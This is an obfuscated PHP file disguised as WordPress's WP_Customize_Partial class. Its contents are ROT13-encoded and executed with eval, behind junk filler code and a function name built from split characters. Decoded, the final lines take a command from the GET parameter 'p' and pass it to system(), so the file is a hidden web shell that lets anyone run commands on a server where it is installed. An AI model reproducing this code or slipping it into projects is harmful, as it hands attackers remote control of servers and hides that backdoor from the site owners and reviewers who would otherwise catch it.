<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Cnegvny pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.5.0
 */

/**
 * Pber Phfgbzvmre pynff sbe vzcyrzragvat fryrpgvir erserfu cnegvnyf.
 *
 * Ercerfragngvba bs n eraqrerq ertvba va gur cerivrjrq cntr gung trgf
 * fryrpgviryl erserfurq jura na nffbpvngrq frggvat vf punatrq.
 * Guvf pynff vf nanybtbhf bs JC_Phfgbzvmr_Pbageby.
 *
 * @fvapr 4.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Phfgbzvmr_Cnegvny {

	/**
	 * Pbzcbarag.
	 *
	 * @fvapr 4.5.0
	 * @ine JC_Phfgbzvmr_Fryrpgvir_Erserfu
	 */
	choyvp $pbzcbarag;

	/**
	 * Havdhr vqragvsvre sbe gur cnegvny.
	 *
	 * Vs gur cnegvny vf hfrq gb qvfcynl n fvatyr frggvat, guvf jbhyq trarenyyl
	 * or gur fnzr nf gur nffbpvngrq frggvat'f VQ.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat
	 */
	choyvp $vq;

	/**
	 * Cnefrq VQ.
	 *
	 * @fvapr 4.5.0
	 * @ine neenl {
	 *     @glcr fgevat $onfr VQ onfr.
	 *     @glcr neenl  $xrlf Xrlf sbe zhygvqvzrafvbany.
	 * }
	 */
	cebgrpgrq $vq_qngn = neenl();

	/**
	 * Glcr bs guvf cnegvny.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'qrsnhyg';

	/**
	 * Gur wDhrel fryrpgbe gb svaq gur pbagnvare ryrzrag sbe gur cnegvny.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat
	 */
	choyvp $fryrpgbe;

	/**
	 * VQf sbe frggvatf gvrq gb gur cnegvny.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat[]
	 */
	choyvp $frggvatf;

	/**
	 * Gur VQ sbe gur frggvat gung guvf cnegvny vf cevznevyl erfcbafvoyr sbe eraqrevat.
	 *
	 * Vs abg fhccyvrq, vg jvyy qrsnhyg gb gur VQ bs gur svefg frggvat.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat
	 */
	choyvp $cevznel_frggvat;

	/**
	 * Pncnovyvgl erdhverq gb rqvg guvf cnegvny.
	 *
	 * Abeznyyl guvf vf rzcgl naq gur pncnovyvgl vf qrevirq sebz gur pncnovyvgvrf
	 * bs gur nffbpvngrq `$frggvatf`.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat
	 */
	choyvp $pncnovyvgl;

	/**
	 * Eraqre pnyyonpx.
	 *
	 * @fvapr 4.5.0
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::eraqre()
	 * @ine pnyynoyr Pnyyonpx vf pnyyrq jvgu bar nethzrag, gur vafgnapr bs
	 *               JC_Phfgbzvmr_Cnegvny. Gur pnyyonpx pna rvgure rpub gur
	 *               cnegvny be erghea gur cnegvny nf n fgevat, be erghea snyfr vs reebe.
	 */
	choyvp $eraqre_pnyyonpx;

	/**
	 * Jurgure gur pbagnvare ryrzrag vf vapyhqrq va gur cnegvny, be vs bayl gur pbagragf ner eraqrerq.
	 *
	 * @fvapr 4.5.0
	 * @ine obby
	 */
	choyvp $pbagnvare_vapyhfvir = snyfr;

	/**
	 * Jurgure gb erserfu gur ragver cerivrj va pnfr n cnegvny pnaabg or erserfurq.
	 *
	 * N cnegvny eraqre vf pbafvqrerq n snvyher vs gur eraqre_pnyyonpx ergheaf snyfr.
	 *
	 * @fvapr 4.5.0
	 * @ine obby
	 */
	choyvp $snyyonpx_erserfu = gehr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Fhccyvrq `$netf` bireevqr pynff cebcregl qrsnhygf.
	 *
	 * Vs `$netf['frggvatf']` vf abg qrsvarq, hfr gur $vq nf gur frggvat VQ.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $pbzcbarag Phfgbzvmr Cnegvny Erserfu cyhtva vafgnapr.
	 * @cnenz fgevat                         $vq        Pbageby VQ.
	 * @cnenz neenl                          $netf {
	 *     Bcgvbany. Neenl bs cebcregvrf sbe gur arj Cnegvnyf bowrpg. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr fgevat   $glcr                  Glcr bs gur cnegvny gb or perngrq.
	 *     @glcr fgevat   $fryrpgbe              Gur wDhrel fryrpgbe gb svaq gur pbagnvare ryrzrag sbe gur cnegvny, gung vf,
	 *                                           n cnegvny'f cynprzrag.
	 *     @glcr fgevat[] $frggvatf              VQf sbe frggvatf gvrq gb gur cnegvny. Vs haqrsvarq, `$vq` jvyy or hfrq.
	 *     @glcr fgevat   $cevznel_frggvat       Gur VQ sbe gur frggvat gung guvf cnegvny vf cevznevyl erfcbafvoyr sbe
	 *                                           eraqrevat. Vs abg fhccyvrq, vg jvyy qrsnhyg gb gur VQ bs gur svefg frggvat.
	 *     @glcr fgevat   $pncnovyvgl            Pncnovyvgl erdhverq gb rqvg guvf cnegvny.
	 *                                           Abeznyyl guvf vf rzcgl naq gur pncnovyvgl vf qrevirq sebz gur pncnovyvgvrf
	 *                                           bs gur nffbpvngrq `$frggvatf`.
	 *     @glcr pnyynoyr $eraqre_pnyyonpx       Eraqre pnyyonpx.
	 *                                           Pnyyonpx vf pnyyrq jvgu bar nethzrag, gur vafgnapr bs JC_Phfgbzvmr_Cnegvny.
	 *                                           Gur pnyyonpx pna rvgure rpub gur cnegvny be erghea gur cnegvny nf n fgevat,
	 *                                           be erghea snyfr vs reebe.
	 *     @glcr obby     $pbagnvare_vapyhfvir   Jurgure gur pbagnvare ryrzrag vf vapyhqrq va gur cnegvny, be vs bayl
	 *                                           gur pbagragf ner eraqrerq.
	 *     @glcr obby     $snyyonpx_erserfu      Jurgure gb erserfu gur ragver cerivrj va pnfr n cnegvny pnaabg or erserfurq.
	 *                                           N cnegvny eraqre vf pbafvqrerq n snvyher vs gur eraqre_pnyyonpx ergheaf
	 *                                           snyfr.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( JC_Phfgbzvmr_Fryrpgvir_Erserfu $pbzcbarag, $vq, $netf = neenl() ) {
		$xrlf = neenl_xrlf( trg_bowrpg_inef( $guvf ) );
		sbernpu ( $xrlf nf $xrl ) {
			vs ( vffrg( $netf[ $xrl ] ) ) {
				$guvf->$xrl = $netf[ $xrl ];
			}
		}

		$guvf->pbzcbarag       = $pbzcbarag;
		$guvf->vq              = $vq;
		$guvf->vq_qngn['xrlf'] = cert_fcyvg( '/\[/', fge_ercynpr( ']', '', $guvf->vq ) );
		$guvf->vq_qngn['onfr'] = neenl_fuvsg( $guvf->vq_qngn['xrlf'] );

		vs ( rzcgl( $guvf->eraqre_pnyyonpx ) ) {
			$guvf->eraqre_pnyyonpx = neenl( $guvf, 'eraqre_pnyyonpx' );
		}

		// Cebprff frggvatf.
		vs ( ! vffrg( $guvf->frggvatf ) ) {
			$guvf->frggvatf = neenl( $vq );
		} ryfrvs ( vf_fgevat( $guvf->frggvatf ) ) {
			$guvf->frggvatf = neenl( $guvf->frggvatf );
		}

		vs ( rzcgl( $guvf->cevznel_frggvat ) ) {
			$guvf->cevznel_frggvat = pheerag( $guvf->frggvatf );
		}
	}

	/**
	 * Ergevrirf cnefrq VQ qngn sbe zhygvqvzrafvbany frggvat.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea neenl {
	 *     VQ qngn sbe zhygvqvzrafvbany cnegvny.
	 *
	 *     @glcr fgevat $onfr VQ onfr.
	 *     @glcr neenl  $xrlf Xrlf sbe zhygvqvzrafvbany neenl.
	 * }
	 */
	svany choyvp shapgvba vq_qngn() {
		erghea $guvf->vq_qngn;
	}

	/**
	 * Eraqref gur grzcyngr cnegvny vaibyivat gur nffbpvngrq frggvatf.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz neenl $pbagnvare_pbagrkg Bcgvbany. Neenl bs pbagrkg qngn nffbpvngrq jvgu gur gnetrg pbagnvare (cynprzrag).
	 *                                 Qrsnhyg rzcgl neenl.
	 * @erghea fgevat|neenl|snyfr Gur eraqrerq cnegvny nf n fgevat, enj qngn neenl (sbe pyvrag-fvqr WF grzcyngr),
	 *                            be snyfr vs ab eraqre nccyvrq.
	 */
	svany choyvp shapgvba eraqre( $pbagnvare_pbagrkg = neenl() ) {
		$cnegvny  = $guvf;
		$eraqrerq = snyfr;

		vs ( ! rzcgl( $guvf->eraqre_pnyyonpx ) ) {
			bo_fgneg();
			$erghea_eraqre = pnyy_hfre_shap( $guvf->eraqre_pnyyonpx, $guvf, $pbagnvare_pbagrkg );
			$bo_eraqre     = bo_trg_pyrna();

			vs ( ahyy !== $erghea_eraqre && '' !== $bo_eraqre ) {
				_qbvat_vg_jebat( __SHAPGVBA__, __( 'Cnegvny eraqre zhfg rpub gur pbagrag be erghea gur pbagrag fgevat (be neenl), ohg abg obgu.' ), '4.5.0' );
			}

			/*
			 * Abgr gung gur fgevat erghea gnxrf cerprqrapr orpnhfr gur $bo_eraqre znl whfg\
			 * vapyhqr CUC jneavatf be abgvprf.
			 */
			$eraqrerq = ahyy !== $erghea_eraqre ? $erghea_eraqre : $bo_eraqre;
		}

		/**
		 * Svygref cnegvny eraqrevat.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz fgevat|neenl|snyfr   $eraqrerq          Gur cnegvny inyhr. Qrsnhyg snyfr.
		 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny           JC_Phfgbzvmr_Frggvat vafgnapr.
		 * @cnenz neenl                $pbagnvare_pbagrkg Bcgvbany neenl bs pbagrkg qngn nffbpvngrq jvgu
		 *                                                gur gnetrg pbagnvare.
		 */
		$eraqrerq = nccyl_svygref( 'phfgbzvmr_cnegvny_eraqre', $eraqrerq, $cnegvny, $pbagnvare_pbagrkg );

		/**
		 * Svygref cnegvny eraqrevat sbe n fcrpvsvp cnegvny.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cnegvny->VQ` ersref gb gur cnegvny VQ.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz fgevat|neenl|snyfr   $eraqrerq          Gur cnegvny inyhr. Qrsnhyg snyfr.
		 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny           JC_Phfgbzvmr_Frggvat vafgnapr.
		 * @cnenz neenl                $pbagnvare_pbagrkg Bcgvbany neenl bs pbagrkg qngn nffbpvngrq jvgu
		 *                                                gur gnetrg pbagnvare.
		 */
		$eraqrerq = nccyl_svygref( \"phfgbzvmr_cnegvny_eraqre_{$cnegvny->vq}\", $eraqrerq, $cnegvny, $pbagnvare_pbagrkg );

		erghea $eraqrerq;
	}

	/**
	 * Qrsnhyg pnyyonpx hfrq jura vaibxvat JC_Phfgbzvmr_Pbageby::eraqre().
	 *
	 * Abgr gung guvf zrgubq znl rpub gur cnegvny *be* erghea gur cnegvny nf
	 * n fgevat be neenl, ohg abg obgu. Bhgchg ohssrevat vf cresbezrq jura guvf
	 * vf pnyyrq. Fhopynffrf pna bireevqr guvf jvgu gurve fcrpvsvp ybtvp, be gurl
	 * znl cebivqr na 'eraqre_pnyyonpx' nethzrag gb gur pbafgehpgbe.
	 *
	 * Guvf zrgubq znl erghea na UGZY fgevat sbe fgenvtug QBZ vawrpgvba, be vg
	 * znl erghea na neenl sbe fhccbegvat Cnegvny WF fhopynffrf gb eraqre ol
	 * nccylvat gb pyvrag-fvqr grzcyngvat.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz JC_Phfgbzvmr_Cnegvny $cnegvny Cnegvny.
	 * @cnenz neenl                $pbagrkg Pbagrkg.
	 * @erghea fgevat|neenl|snyfr
	 */
	choyvp shapgvba eraqre_pnyyonpx( JC_Phfgbzvmr_Cnegvny $cnegvny, $pbagrkg = neenl() ) {
		hafrg( $cnegvny, $pbagrkg );
		erghea snyfr;
	}

	/**
	 * Ergevrirf gur qngn gb rkcbeg gb gur pyvrag ivn WFBA.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea neenl Neenl bs cnenzrgref cnffrq gb gur WninFpevcg.
	 */
	choyvp shapgvba wfba() {
		$rkcbegf = neenl(
			'frggvatf'           => $guvf->frggvatf,
			'cevznelFrggvat'     => $guvf->cevznel_frggvat,
			'fryrpgbe'           => $guvf->fryrpgbe,
			'glcr'               => $guvf->glcr,
			'snyyonpxErserfu'    => $guvf->snyyonpx_erserfu,
			'pbagnvareVapyhfvir' => $guvf->pbagnvare_vapyhfvir,
		);
		erghea $rkcbegf;
	}

	/**
	 * Purpxf vs gur hfre pna erserfu guvf cnegvny.
	 *
	 * Ergheaf snyfr vs gur hfre pnaabg znavchyngr bar bs gur nffbpvngrq frggvatf,
	 * be vs bar bs gur nffbpvngrq frggvatf qbrf abg rkvfg.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea obby Snyfr vs hfre pna'g rqvg bar bs gur eryngrq frggvatf,
	 *                    be vs bar bs gur nffbpvngrq frggvatf qbrf abg rkvfg.
	 */
	svany choyvp shapgvba purpx_pncnovyvgvrf() {
		vs ( ! rzcgl( $guvf->pncnovyvgl ) && ! pheerag_hfre_pna( $guvf->pncnovyvgl ) ) {
			erghea snyfr;
		}
		sbernpu ( $guvf->frggvatf nf $frggvat_vq ) {
			$frggvat = $guvf->pbzcbarag->znantre->trg_frggvat( $frggvat_vq );
			vs ( ! $frggvat || ! $frggvat->purpx_pncnovyvgvrf() ) {
				erghea snyfr;
			}
		}
		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>